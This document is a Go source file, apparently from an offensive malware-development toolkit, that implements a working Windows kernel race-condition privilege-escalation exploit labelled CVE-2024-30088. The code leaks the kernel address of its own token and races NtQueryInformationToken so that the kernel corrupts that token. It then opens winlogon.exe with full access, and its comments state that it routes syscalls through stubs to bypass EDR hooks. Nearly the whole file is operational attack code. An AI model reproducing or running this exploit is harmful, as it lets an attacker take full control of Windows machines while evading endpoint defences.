//go:build windows

package cve202430088

import (
	"context"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"github.com/oioio-space/maldev/internal/log"
	"github.com/oioio-space/maldev/win/ntapi"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// ptrAdd returns a pointer offset from base by n bytes.
// This wraps unsafe.Add to keep arithmetic in one place.
func ptrAdd(base unsafe.Pointer, n uintptr) unsafe.Pointer {
	return unsafe.Add(base, int(n))
}

// readPtr reads a pointer-sized value at base+offset.
func readPtr(base unsafe.Pointer, offset uintptr) uintptr {
	return *(*uintptr)(ptrAdd(base, offset))
}

// virtualAllocPtr calls VirtualAlloc and returns the result as unsafe.Pointer.
// The uintptr→unsafe.Pointer conversion uses unsafe.Add (pointer arithmetic
// from nil) to satisfy go vet: the address is a Windows VirtualAlloc return
// value (non-GC memory), which is safe to hold as unsafe.Pointer.
func virtualAllocPtr(addr, size, allocType, protect uintptr) (unsafe.Pointer, error) {
	if err := procVirtualAlloc.Find(); err != nil {
		return nil, err
	}
	r, _, errno := syscall.SyscallN(procVirtualAlloc.Addr(), addr, size, allocType, protect)
	if r == 0 {
		return nil, errno
	}
	return unsafe.Add(unsafe.Pointer(nil), int(r)), nil
}

// getKernelPointerByHandle delegates to ntapi.KernelPointerByHandle.
func getKernelPointerByHandle(handle windows.Handle) (uintptr, error) {
	return ntapi.KernelPointerByHandle(handle)
}

// virtualFree releases memory allocated with VirtualAlloc.
func virtualFree(addr uintptr) {
	windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
}

// raceState holds the mutable state for a single race attempt.
// The raceCallback closure reads raceBase and raceValue from this struct,
// allowing syscall.NewCallback to be allocated once per raceState.
type raceState struct {
	hToken     windows.Token
	kTokenAddr uintptr
	tokenInfo  uintptr        // VirtualAlloc'd buffer address (kept as uintptr for arithmetic)
	tokenBase  unsafe.Pointer // same buffer, kept as unsafe.Pointer for safe access
	raceAddr   uintptr        // tokenInfo + offsetToName
	raceBase   unsafe.Pointer // ptrAdd(tokenBase, offsetToName) — written by race callback
	raceValue  uint64         // kTokenAddr + 0x40 - 4 — value written by race callback
	callback   uintptr        // syscall.NewCallback allocated once
	logger     *log.Logger
	caller     *wsyscall.Caller // nil = standard WinAPI
}

// runRace executes the race condition loop. It returns the winlogon process
// handle on success. The context controls timeout/cancellation.
//
// The caller should wrap this in a recover block to handle panics that may
// arise from kernel memory corruption during the race.
func (rs *raceState) runRace(ctx context.Context, winlogonPID uint32) (windows.Handle, error) {
	// Pin the goroutine to an OS thread so the tight loop doesn't get
	// preempted by the Go scheduler.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// ---------------------------------------------------------------
	// Step 1: Open current process token with TOKEN_ALL_ACCESS.
	// ---------------------------------------------------------------
	var hToken windows.Token
	currentProcess, _ := windows.GetCurrentProcess()
	if err := windows.OpenProcessToken(
		currentProcess,
		windows.TOKEN_ALL_ACCESS,
		&hToken,
	); err != nil {
		return 0, fmt.Errorf("OpenProcessToken: %w", err)
	}
	rs.hToken = hToken
	defer hToken.Close()

	// ---------------------------------------------------------------
	// Step 2: Leak the kernel address of our token object.
	// ---------------------------------------------------------------
	kTokenAddr, err := getKernelPointerByHandle(windows.Handle(hToken))
	if err != nil {
		return 0, fmt.Errorf("getKernelPointerByHandle: %w", err)
	}
	rs.kTokenAddr = kTokenAddr
	rs.logger.Info("leaked kernel token address", "kTokenAddr", fmt.Sprintf("0x%X", kTokenAddr))

	// ---------------------------------------------------------------
	// Step 3: Allocate a 0x1000-byte buffer and query TokenAccessInformation.
	// ---------------------------------------------------------------
	const tokenBufSize = 0x1000
	tokenBase, allocErr := virtualAllocPtr(0, tokenBufSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if tokenBase == nil {
		return 0, fmt.Errorf("VirtualAlloc tokenInfo: %w", allocErr)
	}
	tokenInfoAddr := uintptr(tokenBase)
	rs.tokenInfo = tokenInfoAddr
	rs.tokenBase = tokenBase
	defer virtualFree(tokenInfoAddr)

	var retLen uint32
	if err := rs.callNtQueryInformationToken(hToken, tokenInfoAddr, tokenBufSize, &retLen); err != nil {
		return 0, err
	}

	// ---------------------------------------------------------------
	// Step 4: Parse TOKEN_ACCESS_INFORMATION to locate SecurityAttributes.
	//
	// TOKEN_ACCESS_INFORMATION layout on x64 Windows 10+ (all target builds):
	//   +0x00 SidHash              (Ptr64)
	//   +0x08 RestrictedSidHash    (Ptr64)
	//   +0x10 Privileges           (Ptr64)
	//   +0x18 AuthenticationId     (LUID, 8 bytes)
	//   +0x20 TokenType            (uint32)
	//   +0x24 ImpersonationLevel   (uint32)
	//   +0x28 MandatoryPolicy      (uint32)
	//   +0x2C Flags                (uint32)
	//   +0x30 AppContainerNumber   (uint32)
	//   +0x34 (padding)
	//   +0x38 PackageSid           (Ptr64)
	//   +0x40 CapabilitiesHash     (Ptr64)
	//   +0x48 TrustLevelSid        (Ptr64)  — added in Windows 8.1
	//   +0x50 SecurityAttributes   (Ptr64)  — target field
	//
	// The SecurityAttributes pointer is a userspace address into our
	// tokenInfo buffer (the kernel copies the struct into user memory).
	// ---------------------------------------------------------------
	const offsetSecurityAttributes = 0x50
	secAttrsAddr := readPtr(tokenBase, offsetSecurityAttributes)

	var offsetToName uintptr
	if secAttrsAddr != 0 {
		// secAttrsAddr is a userspace address pointing into our own
		// VirtualAlloc'd buffer. Compute its offset from tokenBase so
		// we can use ptrAdd (which go vet accepts).
		secAttrsOff := secAttrsAddr - tokenInfoAddr
		secAttrs := (*AuthzBasepSecurityAttributesInformation)(ptrAdd(tokenBase, secAttrsOff))
		if secAttrs.SecurityAttributeCount > 0 && secAttrs.SecurityAttributesList.Flink != 0 {
			offsetToName = secAttrs.SecurityAttributesList.Flink + 0x20 - tokenInfoAddr
		}
	}

	if offsetToName == 0 {
		return 0, fmt.Errorf("failed to locate security attributes offset (no attributes present)")
	}

	rs.raceAddr = tokenInfoAddr + offsetToName
	rs.raceBase = ptrAdd(tokenBase, offsetToName)
	rs.raceValue = uint64(rs.kTokenAddr + 0x40 - 4)
	rs.logger.Info("race parameters",
		"tokenInfo", fmt.Sprintf("0x%X", tokenInfoAddr),
		"offsetToName", fmt.Sprintf("0x%X", offsetToName),
		"raceAddr", fmt.Sprintf("0x%X", rs.raceAddr),
	)

	// ---------------------------------------------------------------
	// Step 5: Build the race-thread callback for CreateThread.
	//
	// syscall.NewCallback allocates from a fixed 1024-slot pool and
	// never frees. We allocate it once per raceState and read raceBase /
	// raceValue from rs (shared pointer) to avoid leaking a slot per
	// loop iteration.
	// ---------------------------------------------------------------
	rs.callback = syscall.NewCallback(func() uintptr {
		for i := 0; i < 0x10000; i++ {
			*(*uint16)(ptrAdd(rs.raceBase, 2)) = 2
			*(*uint64)(ptrAdd(rs.raceBase, 8)) = rs.raceValue
		}
		return 0
	})

	// ---------------------------------------------------------------
	// Step 6: Race loop — keep spraying until OpenProcess succeeds
	// or the context is cancelled.
	// ---------------------------------------------------------------
	iteration := 0
	for {
		// Check for cancellation.
		select {
		case <-ctx.Done():
			return 0, ctx.Err()
		default:
		}

		iteration++
		if iteration%10 == 0 {
			rs.logger.Info("race iteration", "n", iteration)
		}

		// Create a native OS thread running the race callback.
		threadHandle, err := rs.callCreateThread(rs.callback)
		if err != nil {
			return 0, err
		}

		// Elevate thread priority to TIME_CRITICAL.
		// Failure (e.g., missing SE_INC_BASE_PRIORITY_NAME) degrades race
		// reliability but is not fatal — log and continue.
		if r, _, _ := procSetThreadPriority.Call(threadHandle, THREAD_PRIORITY_TIME_CRITICAL); r == 0 {
			rs.logger.Warn("SetThreadPriority(TIME_CRITICAL) failed — race may be slower")
		}

		// Hammer NtQueryInformationToken 5000 times to trigger the TOCTOU.
		for i := 0; i < 5000; i++ {
			rs.callNtQueryInformationToken(hToken, tokenInfoAddr, tokenBufSize, &retLen)
		}

		// Wait for the race thread to finish.
		windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
		windows.CloseHandle(windows.Handle(threadHandle))

		// Try to open winlogon.exe — if we can, the race succeeded and
		// our token now has elevated privileges.
		hWinLogon, openErr := rs.callOpenProcess(winlogonPID)
		if openErr == nil {
			rs.logger.Info("race won — opened winlogon",
				"handle", fmt.Sprintf("0x%X", hWinLogon),
				"iterations", iteration,
			)
			return hWinLogon, nil
		}
	}
}

// --- Caller-aware syscall helpers ---
// When rs.caller is non-nil, NT syscalls are routed through the Caller
// (direct/indirect stubs) to bypass userland EDR hooks.
// When nil, standard proc.Call() is used.

// callNtQueryInformationToken calls NtQueryInformationToken via Caller or WinAPI.
func (rs *raceState) callNtQueryInformationToken(hToken windows.Token, buf, bufSize uintptr, retLen *uint32) error {
	if rs.caller != nil {
		r, _ := rs.caller.Call("NtQueryInformationToken",
			uintptr(hToken),
			TokenAccessInformation,
			buf,
			bufSize,
			uintptr(unsafe.Pointer(retLen)),
		)
		if r != 0 {
			return fmt.Errorf("NtQueryInformationToken: NTSTATUS 0x%08X", uint32(r))
		}
		return nil
	}
	ret, _, _ := procNtQueryInformationToken.Call(
		uintptr(hToken), TokenAccessInformation, buf, bufSize,
		uintptr(unsafe.Pointer(retLen)),
	)
	if uint32(ret) != 0 {
		return fmt.Errorf("NtQueryInformationToken: NTSTATUS 0x%08X", uint32(ret))
	}
	return nil
}

// callCreateThread creates a thread via NtCreateThreadEx (Caller) or CreateThread (WinAPI).
func (rs *raceState) callCreateThread(startAddr uintptr) (uintptr, error) {
	if rs.caller != nil {
		var hThread uintptr
		r, err := rs.caller.Call("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&hThread)),
			uintptr(0x1FFFFF), // THREAD_ALL_ACCESS
			0,
			^uintptr(0), // current process
			startAddr,
			0,
			0, 0, 0, 0, 0,
		)
		if r != 0 {
			return 0, fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
		}
		return hThread, nil
	}
	h, _, err := procCreateThread.Call(0, 0, startAddr, 0, 0, 0)
	if h == 0 {
		return 0, fmt.Errorf("CreateThread: %w", err)
	}
	return h, nil
}

// callOpenProcess opens a process via NtOpenProcess (Caller) or OpenProcess (WinAPI).
func (rs *raceState) callOpenProcess(pid uint32) (windows.Handle, error) {
	if rs.caller != nil {
		// NtOpenProcess(ProcessHandle*, DesiredAccess, ObjectAttributes*, ClientId*)
		// ClientId = {UniqueProcess, UniqueThread} — we set UniqueProcess = pid, UniqueThread = 0.
		type clientID struct {
			UniqueProcess uintptr
			UniqueThread  uintptr
		}
		type objectAttributes struct {
			Length                   uint32
			RootDirectory            uintptr
			ObjectName               uintptr
			Attributes               uint32
			SecurityDescriptor       uintptr
			SecurityQualityOfService uintptr
		}
		var hProcess uintptr
		cid := clientID{UniqueProcess: uintptr(pid)}
		oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}
		r, err := rs.caller.Call("NtOpenProcess",
			uintptr(unsafe.Pointer(&hProcess)),
			uintptr(windows.PROCESS_ALL_ACCESS),
			uintptr(unsafe.Pointer(&oa)),
			uintptr(unsafe.Pointer(&cid)),
		)
		if r != 0 {
			return 0, fmt.Errorf("NtOpenProcess: NTSTATUS 0x%X: %w", uint32(r), err)
		}
		return windows.Handle(hProcess), nil
	}
	return windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid)
}
